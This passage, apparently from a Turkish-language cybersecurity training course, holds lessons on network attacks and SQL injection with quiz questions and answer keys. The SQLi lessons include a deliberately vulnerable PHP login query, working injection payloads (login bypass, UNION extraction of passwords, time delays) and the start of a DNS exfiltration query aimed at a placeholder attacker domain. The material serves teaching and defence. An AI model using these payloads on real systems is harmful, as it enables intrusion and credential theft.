Y\xF6netim \xC7er\xE7eveleri - PMF)","802.1X","WEP"],correct:1}]},{id:"ag-24",title:"WPS A\xE7\u0131kl\u0131klar\u0131 ve Pixie Dust",content:"<h2>WPS A\xE7\u0131kl\u0131klar\u0131 ve Pixie Dust Sald\u0131r\u0131s\u0131</h2><p><strong>WPS (Wi-Fi Protected Setup):</strong> Kullan\u0131c\u0131lar\u0131n karma\u015F\u0131k Wi-Fi \u015Fifrelerini girmeden, 8 haneli basit bir PIN koduyla a\u011Fa kolayca ba\u011Flanmas\u0131n\u0131 sa\u011Flayan bir teknolojidir.</p><p><strong>G\xFCvenlik Riski:</strong> 8 haneli PIN kodu arka planda 4 ve 4 haneli iki ayr\u0131 par\xE7a olarak do\u011Frulan\u0131r. Bu durum sald\u0131rgan\u0131n denemesi gereken olas\u0131l\u0131k say\u0131s\u0131n\u0131 100 milyondan sadece 11 bine d\xFC\u015F\xFCr\xFCr. Kaba kuvvetle PIN kodu kolayca k\u0131r\u0131l\u0131r.</p><p><strong>Pixie Dust Sald\u0131r\u0131s\u0131:</strong> Eri\u015Fim noktas\u0131n\u0131n zay\u0131f rastgele say\u0131 \xFCretecini (PRNG) suistimal ederek, tek bir istek paketiyle PIN kodunu \xE7evrimd\u0131\u015F\u0131 (offline) olarak saniyeler i\xE7inde \xE7\xF6zen geli\u015Fmi\u015F bir sald\u0131r\u0131d\u0131r.</p>",example:"<h3>G\xFCvenlik \xD6nlemi:</h3><p>Modem ve eri\u015Fim noktalar\u0131n\u0131n ayarlar\u0131ndan <strong>WPS (Wi-Fi Korumal\u0131 Kurulum)</strong> \xF6zelli\u011Fi tamamen kapat\u0131lmal\u0131d\u0131r.</p>",questions:[{q:"WPS (Wi-Fi Protected Setup) \xF6zelli\u011Finin siber g\xFCvenlik a\xE7\u0131s\u0131ndan en b\xFCy\xFCk riski nedir?",options:["\u0130nterneti yava\u015Flatmas\u0131","8 haneli PIN kodunun kaba kuvvetle kolayca k\u0131r\u0131labilmesi","Sadece eski bilgisayarlarda \xE7al\u0131\u015Fmas\u0131","\u015Eifreyi her g\xFCn de\u011Fi\u015Ftirmesi"],correct:1},{q:"WPS PIN kodunu \xE7evrimd\u0131\u015F\u0131 ve saniyeler i\xE7inde \xE7\xF6zen geli\u015Fmi\u015F sald\u0131r\u0131 t\xFCr\xFC hangisidir?",options:["Evil Twin","KRACK","Pixie Dust","Deauth"],correct:2},{q:"Bu sald\u0131r\u0131lardan korunmak i\xE7in modem ayarlar\u0131nda ne yap\u0131lmal\u0131d\u0131r?",options:["WPA2 \u015Fifresi uzat\u0131lmal\u0131","WPS \xF6zelli\u011Fi tamamen devre d\u0131\u015F\u0131 b\u0131rak\u0131lmal\u0131","Modem kapat\u0131lmal\u0131","DHCP kapat\u0131lmal\u0131"],correct:1}]},{id:"ag-25",title:"A\u011F Trafi\u011Finde \u015Eifreleme (SSL/TLS)",content:"<h2>A\u011F Trafi\u011Finde \u015Eifreleme (SSL/TLS)</h2><p>SSL (Secure Sockets Layer) ve onun daha modern ve g\xFCvenli ard\u0131l\u0131 olan <strong>TLS (Transport Layer Security)</strong>, a\u011F trafi\u011Findeki verilerin gizlili\u011Fini ve b\xFCt\xFCnl\xFC\u011F\xFCn\xFC korumak i\xE7in ta\u015F\u0131ma katman\u0131 \xFCzerinde \u015Fifreli t\xFCneller olu\u015Fturan kriptografik protokollerdir.</p><p>\xC7al\u0131\u015Fma Mant\u0131\u011F\u0131:</p><ol><li><strong>Handshake (El S\u0131k\u0131\u015Fma):</strong> Taray\u0131c\u0131 ve sunucu destekledikleri \u015Fifreleme algoritmalar\u0131n\u0131 payla\u015F\u0131r, sunucu SSL sertifikas\u0131n\u0131 sunar.</li><li><strong>Anahtar De\u011Fi\u015Fimi:</strong> Simetrik \u015Fifreleme i\xE7in kullan\u0131lacak olan ge\xE7ici oturum anahtar\u0131 g\xFCvenli bir \u015Fekilde olu\u015Fturulur.</li><li><strong>\u015Eifreli \u0130leti\u015Fim:</strong> T\xFCm HTTP trafi\u011Fi bu simetrik anahtarla \u015Fifrelenerek ta\u015F\u0131n\u0131r (HTTPS).</li></ol>",example:"<h3>\xD6rnek:</h3><p>Bir e-ticaret sitesine kredi kart\u0131 bilginizi girdi\u011Finizde, taray\u0131c\u0131 ile sunucu aras\u0131ndaki TLS t\xFCneli sayesinde kart bilginiz a\u011F kablosundan \u015Fifreli olarak ge\xE7er. Araya giren biri kart numaras\u0131n\u0131 g\xF6remez.</p>",questions:[{q:"SSL/TLS protokol\xFCn\xFCn a\u011F ileti\u015Fimine sa\u011Flad\u0131\u011F\u0131 en kritik iki g\xFCvenlik unsuru hangisidir?",options:["H\u0131z ve bant geni\u015Fli\u011Fi","Gizlilik (\u015Eifreleme) ve B\xFCt\xFCnl\xFCk (Veri de\u011Fi\u015Ftirilemezli\u011Fi)","IP gizleme ve y\xF6nlendirme","Port kapatma ve antivir\xFCs"],correct:1},{q:"SSL protokol\xFCn\xFCn g\xFCncel, g\xFCvenli ve aktif olarak kullan\u0131lan modern s\xFCr\xFCm\xFC hangisidir?",options:["WEP","TLS","HTTP","MD5"],correct:1},{q:"TLS el s\u0131k\u0131\u015Fmas\u0131 tamamland\u0131ktan sonra verilerin \u015Fifrelenmesinde hangi \u015Fifreleme t\xFCr\xFC kullan\u0131l\u0131r?",options:["Asimetrik \u015Eifreleme","Simetrik \u015Eifreleme (Oturum Anahtar\u0131)","\xD6zetleme (Hashing)","Sezar \u015Eifrelemesi"],correct:1}]},{id:"ag-26",title:"SSH T\xFCnelleme ve Port Y\xF6nlendirme",content:"<h2>SSH T\xFCnelleme ve Port Y\xF6nlendirme (Port Forwarding)</h2><p>SSH t\xFCnelleme, SSH protokol\xFCn\xFC kullanarak g\xFCvensiz bir a\u011F \xFCzerinden ba\u015Fka bir a\u011F servisinin trafi\u011Fini g\xFCvenli ve \u015Fifreli bir \u015Fekilde ta\u015F\u0131ma (encapsulation) y\xF6ntemidir.</p><p>\xDC\xE7 T\xFCrl\xFC Port Y\xF6nlendirme Vard\u0131r:</p><ul><li><strong>Yerel Port Y\xF6nlendirme (Local Port Forwarding):</strong> Kendi bilgisayar\u0131n\u0131zdaki bir portu, SSH sunucusu \xFCzerinden hedef a\u011Fdaki bir porta y\xF6nlendirir.</li><li><strong>Uzak Port Y\xF6nlendirme (Remote Port Forwarding):</strong> SSH sunucusundaki bir portu, kendi bilgisayar\u0131n\u0131zdaki bir porta y\xF6nlendirir (D\u0131\u015Far\u0131dan i\xE7eri s\u0131zma i\xE7in kullan\u0131l\u0131r).</li><li><strong>Dinamik Port Y\xF6nlendirme:</strong> Bilgisayar\u0131n\u0131zda bir SOCKS proxy olu\u015Fturarak t\xFCm taray\u0131c\u0131 trafi\u011Fini SSH \xFCzerinden ge\xE7irir.</li></ul>",example:"<h3>Komut \xD6rne\u011Fi:</h3><p>D\u0131\u015Far\u0131ya kapal\u0131 olan yerel bir web sunucusunu (port 80), kendi localhost:8080 portunuza t\xFCnellemek i\xE7in: <code>ssh -L 8080:localhost:80 user@ssh-server</code> kullan\u0131l\u0131r.</p>",questions:[{q:"SSH t\xFCnelleme i\u015Flemi genel olarak ne ama\xE7la kullan\u0131l\u0131r?",options:["\u015Eifre k\u0131rmak i\xE7in","A\u011F trafi\u011Fini \u015Fifreli bir t\xFCnel \xFCzerinden g\xFCvenle ta\u015F\u0131mak veya g\xFCvenlik duvarlar\u0131n\u0131 a\u015Fmak i\xE7in","Modemi yeniden ba\u015Flatmak i\xE7in","Port taramas\u0131n\u0131 engellemek i\xE7in"],correct:1},{q:"Kendi bilgisayar\u0131n\u0131zda bir SOCKS proxy yaratarak t\xFCm trafi\u011Fi SSH \xFCzerinden y\xF6nlendiren t\xFCnelleme t\xFCr\xFC hangisidir?",options:["Yerel Port Y\xF6nlendirme","Uzak Port Y\xF6nlendirme","Dinamik Port Y\xF6nlendirme","Statik Y\xF6nlendirme"],correct:2},{q:"Uzak bir SSH sunucusundaki portu kendi bilgisayar\u0131n\u0131za t\xFCnellemek i\xE7in hangi SSH parametresi kullan\u0131l\u0131r?",options:["-L (Local)","-R (Remote)","-D (Dynamic)","-p"],correct:1}]},{id:"ag-27",title:"VLAN ve VLAN Hopping Sald\u0131r\u0131lar\u0131",content:"<h2>VLAN ve VLAN Hopping Sald\u0131r\u0131lar\u0131</h2><p><strong>VLAN (Virtual Local Area Network - Sanal Yerel A\u011F):</strong> Fiziksel bir a\u011F\u0131 mant\u0131ksal olarak alt a\u011Flara b\xF6lerek trafi\u011Fi izole eden switch teknolojisidir. Farkl\u0131 departmanlar\u0131n (\xF6rn. \u0130K ve Muhasebe) trafi\u011Fi birbirini g\xF6remez.</p><p><strong>VLAN Hopping (VLAN Atlama):</strong> Bir sald\u0131rgan\u0131n, \xFCye olmad\u0131\u011F\u0131 ba\u015Fka bir VLAN'\u0131n trafi\u011Fine s\u0131zmas\u0131 veya o VLAN'a paket g\xF6ndermesi sald\u0131r\u0131s\u0131d\u0131r.</p><p>Y\xF6ntemler:</p><ul><li><strong>Switch Spoofing:</strong> Sald\u0131rgan\u0131n bilgisayar\u0131n\u0131 switch gibi g\xF6sterip trunk ba\u011Flant\u0131s\u0131 kurmas\u0131 (DTP protokol\xFC a\xE7\u0131ksa).</li><li><strong>Double Tagging (\xC7ift Etiketleme):</strong> Pakete \xFCst \xFCste iki VLAN etiketi ekleyerek switch'i kand\u0131rma ve hedef VLAN'a paket iletme.</li></ul>",example:"<h3>Korunma:</h3><p>Switch'lerde kullan\u0131lmayan portlar kapat\u0131lmal\u0131, DTP (Dynamic Trunking Protocol) devre d\u0131\u015F\u0131 b\u0131rak\u0131lmal\u0131 ve varsay\u0131lan VLAN 1 yerine ba\u015Fka bir Native VLAN belirlenmelidir.</p>",questions:[{q:"A\u011F trafi\u011Fini mant\u0131ksal olarak izole etmek ve departmanlar\u0131 birbirinden ay\u0131rmak i\xE7in switch \xFCzerinde kurulan teknoloji hangisidir?",options:["VLAN","VPN","DHCP","NAT"],correct:0},{q:"Sald\u0131rgan\u0131n bilgisayar\u0131n\u0131 bir switch gibi tan\u0131tarak trunk ba\u011Flant\u0131s\u0131 kurmaya \xE7al\u0131\u015Ft\u0131\u011F\u0131 VLAN atlama sald\u0131r\u0131s\u0131 hangisidir?",options:["Double Tagging","Switch Spoofing","ARP Spoofing","MAC Flooding"],correct:1},{q:"VLAN Hopping sald\u0131r\u0131lar\u0131n\u0131 engellemek i\xE7in switch yap\u0131land\u0131rmas\u0131nda ne yap\u0131lmal\u0131d\u0131r?",options:["T\xFCm portlar trunk yap\u0131lmal\u0131","DTP (Dynamic Trunking Protocol) kapat\u0131lmal\u0131 ve Native VLAN 1 de\u011Fi\u015Ftirilmeli","DHCP devre d\u0131\u015F\u0131 b\u0131rak\u0131lmal\u0131","IP adresleri statik yap\u0131lmal\u0131"],correct:1}]},{id:"ag-28",title:"DDoS ve DoS Sald\u0131r\u0131 \xC7e\u015Fitleri",content:"<h2>DDoS ve DoS Sald\u0131r\u0131 \xC7e\u015Fitleri</h2><p>DoS (Denial of Service) ve da\u011F\u0131t\u0131k mimarili <strong>DDoS (Distributed Denial of Service)</strong>, hedef sistemin kaynaklar\u0131n\u0131 (CPU, RAM, bant geni\u015Fli\u011Fi) t\xFCketerek yasal kullan\u0131c\u0131lara hizmet veremez hale getirilmesi sald\u0131r\u0131lar\u0131d\u0131r.</p><p>S\u0131k Kullan\u0131lan Sald\u0131r\u0131 \xC7e\u015Fitleri:</p><ul><li><strong>SYN Flood:</strong> Sunucuya \xE7ok say\u0131da sahte SYN iste\u011Fi g\xF6nderilir. Sunucu SYN-ACK d\xF6ner ve yan\u0131t (ACK) bekler. Ba\u011Flant\u0131lar a\xE7\u0131k kal\u0131r ve sunucu kaynaklar\u0131 t\xFCkenir (Yar\u0131m a\xE7\u0131k ba\u011Flant\u0131 sald\u0131r\u0131s\u0131).</li><li><strong>UDP Flood:</strong> Hedef portlara \xE7ok say\u0131da UDP paketi g\xF6nderilerek a\u011F bant geni\u015Fli\u011Fi doldurulur.</li><li><strong>HTTP Flood:</strong> Web sunucusuna yo\u011Fun Get/Post istekleri at\u0131larak web uygulamas\u0131n\u0131n kilitlenmesi sa\u011Flan\u0131r (Katman 7 sald\u0131r\u0131s\u0131).</li></ul>",example:"<h3>Botnet kavram\u0131:</h3><p>DDoS sald\u0131r\u0131lar\u0131 genellikle sald\u0131rgan\u0131n kontrol\xFCndeki binlerce zombi bilgisayardan (Botnet) olu\u015Fan bir a\u011F \xFCzerinden tek bir hedefe y\xF6nelik ba\u015Flat\u0131l\u0131r.</p>",questions:[{q:"Sunucuya s\xFCrekli SYN paketi g\xF6nderip el s\u0131k\u0131\u015Fmay\u0131 tamamlamayarak sunucu kaynaklar\u0131n\u0131 t\xFCketen DoS sald\u0131r\u0131s\u0131 hangisidir?",options:["UDP Flood","SYN Flood","Ping of Death","Slowloris"],correct:1},{q:"DDoS sald\u0131r\u0131lar\u0131nda sald\u0131rgan\u0131n kontrol\xFC alt\u0131ndaki vir\xFCsl\xFC/zombi bilgisayarlar ordusuna ne ad verilir?",options:["Honeypot","Botnet","IDS","Firewall"],correct:1},{q:"Web sunucusuna yo\u011Fun HTTP GET istekleri g\xF6ndererek uygulama katman\u0131n\u0131 kilitleyen sald\u0131r\u0131 t\xFCr\xFC hangisidir?",options:["SYN Flood","ICMP Flood","HTTP Flood","ARP Spoofing"],correct:2}]},{id:"ag-29",title:"Honeypot (Bal K\xFCp\xFC) Teknolojisi",content:"<h2>Honeypot (Bal K\xFCp\xFC) Teknolojisi</h2><p>Honeypot, siber sald\u0131rganlar\u0131 cezbetmek, onlar\u0131n sald\u0131r\u0131 y\xF6ntemlerini analiz etmek ve ana sistemleri korumak i\xE7in bilerek zafiyetli b\u0131rak\u0131lm\u0131\u015F sahte sistem veya a\u011F ortam\u0131d\u0131r.</p><p>\xD6zellikleri:</p><ul><li>\xDCretim sistemlerinden izole edilmi\u015Ftir.</li><li>Ger\xE7ek hi\xE7bir ticari veya hassas veri bar\u0131nd\u0131rmaz.</li><li>Honeypot'a gelen her t\xFCrl\xFC trafik veya ba\u011Flant\u0131 giri\u015Fimi do\u011Frudan \u015F\xFCpheli / zararl\u0131 kabul edilir, \xE7\xFCnk\xFC yasal kullan\u0131c\u0131lar\u0131n bu sahte sistemle i\u015Fi yoktur.</li></ul>",example:"<h3>Kullan\u0131m Alan\u0131:</h3><p>A\u011Fda zay\u0131f \u015Fifreli sahte bir SSH sunucusu (Honeypot) kurulur. Sald\u0131rgan bu SSH portuna kaba kuvvet sald\u0131r\u0131s\u0131 yapt\u0131\u011F\u0131nda, t\xFCm denedi\u011Fi \u015Fifreler ve IP adresi an\u0131nda g\xFCvenlik ekipleri taraf\u0131ndan kaydedilir.</p>",questions:[{q:"Sald\u0131rganlar\u0131 tuzaklamak ve analiz etmek amac\u0131yla bilerek kurulan sahte zafiyetli sistemlere ne ad verilir?",options:["Firewall","Honeypot (Bal K\xFCp\xFC)","IDS","Backdoor"],correct:1},{q:"Honeypot sistemlerinin siber g\xFCvenlik analizine en b\xFCy\xFCk katk\u0131s\u0131 nedir?",options:["Sald\u0131r\u0131lar\u0131 tamamen engellemesi","Sald\u0131rganlar\u0131n IP adreslerini, kulland\u0131klar\u0131 ara\xE7lar\u0131 ve exploit y\xF6ntemlerini g\xFCvenli bir ortamda kaydetmek","A\u011F kartlar\u0131n\u0131 h\u0131zland\u0131rmas\u0131","\u015Eifreleri otomatik k\u0131rmas\u0131"],correct:1},{q:"Honeypot'a gelen bir ba\u011Flant\u0131 iste\u011Fi hakk\u0131nda ne s\xF6ylenebilir?",options:["Yasal bir kullan\u0131c\u0131d\u0131r","Do\u011Frudan \u015F\xFCpheli/sald\u0131r\u0131 giri\u015Fimi olarak kabul edilir","E-posta trafi\u011Fidir","DNS sorgusudur"],correct:1}]},{id:"ag-30",title:"A\u011F G\xFCvenli\u011Finde S\u0131f\u0131r G\xFCven (Zero Trust)",content:"<h2>S\u0131f\u0131r G\xFCven (Zero Trust) Mimarisi</h2><p>Geleneksel a\u011F g\xFCvenli\u011Fi 'Kale ve Hendek' modelini kullan\u0131r: A\u011F\u0131n d\u0131\u015F\u0131 tehlikeli, i\xE7i ise g\xFCvenlidir. Ancak i\xE7eri s\u0131zan bir sald\u0131rgan a\u011Fda serbest\xE7e hareket edebilir.</p><p><strong>S\u0131f\u0131r G\xFCven (Zero Trust) Modeli:</strong> 'Asla g\xFCvenme, her zaman do\u011Frula' prensibine dayan\u0131r. A\u011F\u0131n i\xE7inde veya d\u0131\u015F\u0131nda olmas\u0131na bak\u0131lmaks\u0131z\u0131n, her cihaz ve kullan\u0131c\u0131 her i\u015Flemde s\xFCrekli olarak do\u011Frulan\u0131r ve yetkilendirilir. A\u011F i\xE7i yatay hareketleri (Lateral Movement) engellemek i\xE7in a\u011F mikro-b\xF6l\xFCmlere (micro-segmentation) ayr\u0131l\u0131r.</p>",example:"<h3>Uygulama:</h3><p>Zero Trust mimarisinde, \u015Firket bilgisayar\u0131yla ofisteki yerel a\u011Fa ba\u011Flansan\u0131z dahi, \u015Firket i\xE7i kaynaklara eri\u015Fmek i\xE7in tekrar iki a\u015Famal\u0131 do\u011Frulama (MFA) yapman\u0131z ve cihaz\u0131n\u0131z\u0131n g\xFCvenlik taramas\u0131ndan ge\xE7mesi istenir.</p>",questions:[{q:"Zero Trust (S\u0131f\u0131r G\xFCven) mimarisinin temel slogan\u0131/prensibi hangisidir?",options:["\u0130\xE7eridekilere g\xFCven, d\u0131\u015Far\u0131dakileri do\u011Frula","Asla g\xFCvenme, her zaman do\u011Frula (Never trust, always verify)","Sadece g\xFC\xE7l\xFC \u015Fifreler kullan","T\xFCm portlar\u0131 a\xE7\u0131k tut"],correct:1},{q:"Zero Trust modelinde sald\u0131rgan\u0131n a\u011F i\xE7inde serbest\xE7e yatay hareket etmesini (lateral movement) zorla\u015Ft\u0131rmak i\xE7in kullan\u0131lan y\xF6ntem hangisidir?",options:["Mikro-b\xF6l\xFCmleme (Micro-segmentation)","Daha b\xFCy\xFCk alt a\u011Flar olu\u015Fturmak","Sadece VPN kullanmak","Antivir\xFCs kurmak"],correct:0},{q:"A\u015Fa\u011F\u0131dakilerden hangisi Zero Trust mimarisinin temel bile\u015Fenlerinden biri de\u011Fildir?",options:["\xC7ok Fakt\xF6rl\xFC Kimlik Do\u011Frulama (MFA)","Cihaz Sa\u011Fl\u0131k Kontrol\xFC","S\u0131n\u0131rs\u0131z S\xFCreli G\xFCvenilir A\u011F \u0130\xE7i Eri\u015Fim Yetkisi","En D\xFC\u015F\xFCk Yetki Prensibi (Least Privilege)"],correct:2}]}],"uyg-guvenligi":[{id:"uyg-01",title:"OWASP Top 10 Nedir?",content:"<h2>OWASP Top 10 ve Uygulama G\xFCvenli\u011Fi</h2><p>OWASP (Open Web Application Security Project), web uygulama g\xFCvenli\u011Fini art\u0131rmak i\xE7in \xE7al\u0131\u015Fan k\xFCresel ve tarafs\u0131z bir topluluktur.</p><p><strong>OWASP Top 10:</strong> Web uygulamalar\u0131nda en s\u0131k kar\u015F\u0131la\u015F\u0131lan ve en kritik 10 g\xFCvenlik riskini listeleyen, d\xFCnya \xE7ap\u0131nda kabul g\xF6rm\xFC\u015F bir standartt\u0131r. Bu liste d\xFCzenli olarak g\xFCncellenir ve geli\u015Ftiricilere, g\xFCvenlik uzmanlar\u0131na uygulamalar\u0131n\u0131 nas\u0131l koruyacaklar\u0131n\u0131 \xF6\u011Fretir. SQL Injection, XSS, Yetkilendirme Hatalar\u0131 ve G\xFCvenlik Duvar\u0131 Yap\u0131land\u0131rmalar\u0131 bu listede \xFCst s\u0131ralarda yer al\u0131r.</p>",example:"<h3>\xD6nemli \xC7\u0131kt\u0131:</h3><p>Geli\u015Ftirilen her web uygulamas\u0131n\u0131n g\xFCvenlik testleri (SAST/DAST) OWASP Top 10 standartlar\u0131na g\xF6re yap\u0131l\u0131r. Bu standartlar\u0131 bilmek, web g\xFCvenli\u011Fi kariyerinin temel ta\u015F\u0131d\u0131r.</p>",questions:[{q:"OWASP toplulu\u011Funun temel amac\u0131 nedir?",options:["\u0130\u015Fletim sistemleri yazmak","Web uygulama g\xFCvenli\u011Fini ve standartlar\u0131n\u0131 art\u0131rmak","Arama motoru geli\u015Ftirmek","Hosting hizmeti sunmak"],correct:1},{q:"OWASP Top 10 listesi neyi ifade eder?",options:["En pop\xFCler 10 programlama dilini","Web uygulamalar\u0131ndaki en kritik 10 g\xFCvenlik riskini","En \xE7ok ziyaret edilen 10 web sitesini","En g\xFCvenli 10 taray\u0131c\u0131y\u0131"],correct:1},{q:"A\u015Fa\u011F\u0131daki zafiyetlerden hangisi genellikle OWASP Top 10 listesinin en kritik ba\u015Fl\u0131klar\u0131 aras\u0131nda yer al\u0131r?",options:["Yava\u015F internet ba\u011Flant\u0131s\u0131","Enjeksiyon (Injection) A\xE7\u0131kl\u0131klar\u0131","CSS dosya hatalar\u0131","Responsive tasar\u0131m eksikli\u011Fi"],correct:1}]},{id:"uyg-02",title:"SQL Injection (SQLi) Temelleri",content:"<h2>SQL Injection (SQLi) Nedir?</h2><p>SQL Injection, sald\u0131rgan\u0131n uygulama girdilerine zararl\u0131 SQL komutlar\u0131 enjekte ederek, arka plandaki veritaban\u0131 sorgular\u0131n\u0131n yap\u0131s\u0131n\u0131 de\u011Fi\u015Ftirdi\u011Fi ve veritaban\u0131na yetkisiz eri\u015Fim sa\u011Flad\u0131\u011F\u0131 en eski ve tehlikeli zafiyetlerden biridir.</p><p>Zafiyet, kullan\u0131c\u0131dan al\u0131nan verilerin parametrik sorgular (Prepared Statements) yerine, string birle\u015Ftirme yoluyla do\u011Frudan SQL sorgusuna eklenmesinden kaynaklan\u0131r.</p>",example:`<h3>Zafiyetli Kod \xD6rne\u011Fi (PHP):</h3><pre><code>$query = "SELECT * FROM users WHERE user = '" . $_POST['username'] . "' AND pass = '" . $_POST['password'] . "'";</code></pre><p>Sald\u0131rgan kullan\u0131c\u0131 ad\u0131 alan\u0131na <code>admin' OR '1'='1</code> yazd\u0131\u011F\u0131nda sorgu \u015Funa d\xF6n\xFC\u015F\xFCr: <code>SELECT * FROM users WHERE user = 'admin' OR '1'='1' ...</code> ve \u015Fifre kontrol\xFC bypass edilir.</p>`,questions:[{q:"SQL Injection zafiyetinin temel ortaya \xE7\u0131k\u0131\u015F nedeni nedir?",options:["Veritaban\u0131n\u0131n \xE7ok eski olmas\u0131","Kullan\u0131c\u0131 girdilerinin temizlenmeden sorgu stringi ile birle\u015Ftirilip SQL motoruna g\xF6nderilmesi","\u015Eifrelerin karma\u015F\u0131k olmamas\u0131","HTTPS \u015Fifrelemesinin kullan\u0131lmamas\u0131"],correct:1},{q:"A\u015Fa\u011F\u0131dakilerden hangisi SQL Injection a\xE7\u0131klar\u0131ndan korunman\u0131n en etkili yoludur?",options:["Antivir\xFCs kullanmak","Parametrik Sorgular (Prepared Statements) kullanmak","JavaScript ile girdileri kontrol etmek","Veritaban\u0131n\u0131 \u015Fifrelemek"],correct:1},{q:"Zafiyetli bir giri\u015F panelinde kullan\u0131c\u0131 ad\u0131 alan\u0131na 'OR 1=1' yaz\u0131ld\u0131\u011F\u0131nda ne ama\xE7lan\u0131r?",options:["Yeni kullan\u0131c\u0131 olu\u015Fturmak","Sorgunun her zaman do\u011Fru (True) d\xF6nmesini sa\u011Flayarak \u015Fifresiz giri\u015F yapmak","Veritaban\u0131n\u0131 silmek","Sayfay\u0131 \xE7\xF6kertmek"],correct:1}]},{id:"uyg-03",title:"In-Band SQLi (Error & Union Based)",content:"<h2>In-Band SQL Injection</h2><p>In-Band SQLi, sald\u0131rgan\u0131n enjeksiyonu yapt\u0131\u011F\u0131 kanal ile veritaban\u0131 yan\u0131tlar\u0131n\u0131 ald\u0131\u011F\u0131 kanal\u0131n ayn\u0131 oldu\u011Fu en yayg\u0131n SQLi t\xFCr\xFCd\xFCr.</p><p>\u0130ki alt t\xFCre ayr\u0131l\u0131r:</p><ul><li><strong>Error-Based (Hata Tabanl\u0131) SQLi:</strong> Sald\u0131rgan, sorguda bilerek hata tetikler (\xF6rn. s\xF6zdizimi hatas\u0131) ve veritaban\u0131n\u0131n d\xF6nd\xFCrd\xFC\u011F\xFC hata mesajlar\u0131ndan veritaban\u0131 \u015Femas\u0131 ve veriler hakk\u0131nda bilgi toplar.</li><li><strong>Union-Based (Birlik Tabanl\u0131) SQLi:</strong> Sald\u0131rgan, orijinal sorgunun sonuna <code>UNION SELECT</code> ekleyerek kendi belirledi\u011Fi verileri de sonu\xE7 k\xFCmesine dahil eder ve sayfaya yans\u0131t\u0131r.</li></ul>",example:"<h3>UNION SQLi Ad\u0131mlar\u0131:</h3><p>1. S\xFCtun say\u0131s\u0131n\u0131 bulma: <code>' ORDER BY 3--</code><br/>2. Veri s\u0131zd\u0131rma: <code>' UNION SELECT null, username, password FROM users--</code></p>",questions:[{q:"Veritaban\u0131n\u0131n d\xF6nd\xFCrd\xFC\u011F\xFC detayl\u0131 hata mesajlar\u0131n\u0131 kullanarak veri s\u0131zd\u0131rmaya \xE7al\u0131\u015Fan SQLi t\xFCr\xFC hangisidir?",options:["Error-Based SQLi","Time-Based Blind SQLi","Out-of-Band SQLi","Boolean-Based Blind SQLi"],correct:0},{q:"UNION-Based SQLi sald\u0131r\u0131s\u0131nda, UNION sorgusu eklemeden \xF6nce hedef tablodaki s\xFCtun say\u0131s\u0131n\u0131 bulmak i\xE7in hangi SQL ifadesi kullan\u0131l\u0131r?",options:["GROUP BY","ORDER BY","SELECT ALL","WHERE LIMIT"],correct:1},{q:"UNION SELECT sorgusunun \xE7al\u0131\u015Fabilmesi i\xE7in en temel kural nedir?",options:["Veritaban\u0131n\u0131n MySQL olmas\u0131","Orijinal sorgu ile UNION sorgusunun d\xF6nd\xFCrd\xFC\u011F\xFC s\xFCtun say\u0131s\u0131n\u0131n ve veri tiplerinin e\u015Fle\u015Fmesi","Kullan\u0131c\u0131n\u0131n admin yetkisine sahip olmas\u0131","Sistemin \xE7evrimd\u0131\u015F\u0131 olmas\u0131"],correct:1}]},{id:"uyg-04",title:"Blind SQLi (Boolean & Time-Based)",content:"<h2>Blind (K\xF6r) SQL Injection</h2><p>Uygulama, veritaban\u0131 hata mesajlar\u0131n\u0131 gizliyorsa veya sorgu sonu\xE7lar\u0131n\u0131 do\u011Frudan sayfaya yans\u0131tm\u0131yorsa In-Band SQLi \xE7al\u0131\u015Fmaz. Bu durumda <strong>Blind SQLi</strong> teknikleri kullan\u0131l\u0131r.</p><p>\xC7e\u015Fitleri:</p><ul><li><strong>Boolean-Based:</strong> Sald\u0131rgan veritaban\u0131na do\u011Fru (True) ve yanl\u0131\u015F (False) sorular sorar. Sayfan\u0131n de\u011Fi\u015Fip de\u011Fi\u015Fmedi\u011Fine bakarak (\xF6rn. \xFCr\xFCn\xFCn g\xF6r\xFCn\xFCp g\xF6r\xFCnmemesi) harf harf verileri \xE7\xF6zer.</li><li><strong>Time-Based (Zaman Tabanl\u0131):</strong> Sorulan soruya g\xF6re veritaban\u0131n\u0131n yan\u0131t s\xFCresini geciktirir (\xF6rn. `sleep(5)`). E\u011Fer sayfa 5 saniye ge\xE7 y\xFCklenirse ko\u015Fulun do\u011Fru oldu\u011Fu anla\u015F\u0131l\u0131r.</li></ul>",example:"<h3>Zaman Geciktirme Sorgusu:</h3><p><code>' OR IF(1=1, sleep(5), 0)--</code> sorgusunda, 1=1 do\u011Fru oldu\u011Fu i\xE7in web sunucusu yan\u0131t\u0131 5 saniye geciktirir.</p>",questions:[{q:"Sayfa i\xE7eri\u011Finde hi\xE7bir veri veya hata g\xF6r\xFCnmedi\u011Finde, veritaban\u0131 yan\u0131t\u0131n\u0131n gecikme s\xFCresine bakarak veri s\u0131zd\u0131rmay\u0131 sa\u011Flayan zafiyet hangisidir?",options:["Union-Based SQLi","Time-Based Blind SQLi","Reflected XSS","Boolean-Based SQLi"],correct:1},{q:"Boolean-based Blind SQLi sald\u0131r\u0131s\u0131nda veri nas\u0131l elde edilir?",options:["Sayfaya yans\u0131yan hata kodlar\u0131yla","Veritaban\u0131n\u0131n True/False ko\u015Fullar\u0131na verdi\u011Fi sayfa i\xE7eri\u011Fi de\u011Fi\u015Fikliklerini analiz ederek","E-posta g\xF6ndererek","Dosya indirerek"],correct:1},{q:"Zaman tabanl\u0131 SQL enjeksiyonunda veritaban\u0131n\u0131 geciktirmek i\xE7in hangi fonksiyon kullan\u0131l\u0131r?",options:["DELAY()","SLEEP() / WAITFOR DELAY","PAUSE()","STOP()"],correct:1}]},{id:"uyg-05",title:"Out-of-Band (OAST) SQLi",content:"<h2>Out-of-Band (OAST) SQL Injection</h2><p>Out-of-Band SQLi, sald\u0131rgan\u0131n enjeksiyonu yapt\u0131\u011F\u0131 kanal \xFCzerinden veritaban\u0131 yan\u0131t\u0131n\u0131 alamad\u0131\u011F\u0131 (yani ne hata mesaj\u0131, ne sayfa de\u011Fi\u015Fikli\u011Fi, ne de zaman gecikmesi kullanamad\u0131\u011F\u0131) durumlarda, verileri harici bir a\u011F protokol\xFC (DNS, HTTP) \xFCzerinden d\u0131\u015Far\u0131 s\u0131zd\u0131rma y\xF6ntemidir.</p><p>Sald\u0131rgan veritaban\u0131na, kendi kontrol\xFCndeki bir sunucuya (\xF6rn. <code>saldirgan.com</code>) DNS sorgusu atmas\u0131n\u0131 tetikleyecek bir sorgu g\xF6nderir. S\u0131zd\u0131r\u0131lacak veri, bu DNS sorgusunun subdomain k\u0131sm\u0131na eklenir.</p>",example:"<h3>\xD6rnek Tetikleme (MSSQL):</h3><pre><code>DECLARE @host varchar(1024); SELECT @host = (SELECT password FROM users 